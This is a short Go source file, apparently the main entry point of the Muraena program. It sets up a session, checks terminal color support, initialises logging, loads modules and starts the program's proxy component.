package main

import (
	"fmt"
	"os"

	"github.com/muraenateam/muraena/core/proxy"
	"github.com/muraenateam/muraena/log"
	"github.com/muraenateam/muraena/module"
	"github.com/muraenateam/muraena/session"

	"github.com/evilsocket/islazy/tui"
)

func main() {

	sess, err := session.New()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	if !tui.Effects() {
		if *sess.Options.NoColors {
			fmt.Printf("\n\nWARNING: Terminal colors have been disabled, view will be very limited.\n\n")
		} else {
			fmt.Printf("\n\nWARNING: This terminal does not support colors, view will be very limited.\n\n")
		}
	}

	// Init Log
	log.Init(sess.Options, sess.Config.Log.Enabled, sess.Config.Log.FilePath)

	// Load all modules
	module.LoadModules(sess)

	// Run Muraena
	proxy.Run(sess)
}
